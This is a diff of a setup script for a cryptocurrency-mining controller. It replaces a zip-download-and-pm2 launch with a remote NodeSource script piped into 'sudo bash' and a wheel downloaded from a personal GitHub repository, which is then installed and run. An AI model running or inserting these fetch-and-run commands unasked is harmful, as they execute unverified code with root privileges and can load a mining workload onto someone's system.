@@ -1,9 +1,10 @@
-curl -O -L -J  https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/polas.zip
-unzip polas.zip
-npm install --omit=dev
-npm install --global pm2
-
-python3 -m py_compile miner_bridge.py
-mkdir -p data logs
-chmod 700 .env
-sudo pm2 start main.mjs
+sudo apt update
+sudo apt install -y python3.11 python3.11-venv
+curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
+sudo apt install nodejs -y
+wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/xmrig_controller-2.0.0-cp311-cp311-linux_x86_64.whl
+python3.11 -m venv ~/.venvs/xmrig-controller
+    ~/.venvs/xmrig-controller/bin/pip install \
+      xmrig_controller-2.0.0-cp311-cp311-linux_x86_64.whl
+~/.venvs/xmrig-controller/bin/xmrig-controller init
+~/.venvs/xmrig-controller/bin/xmrig-controller run
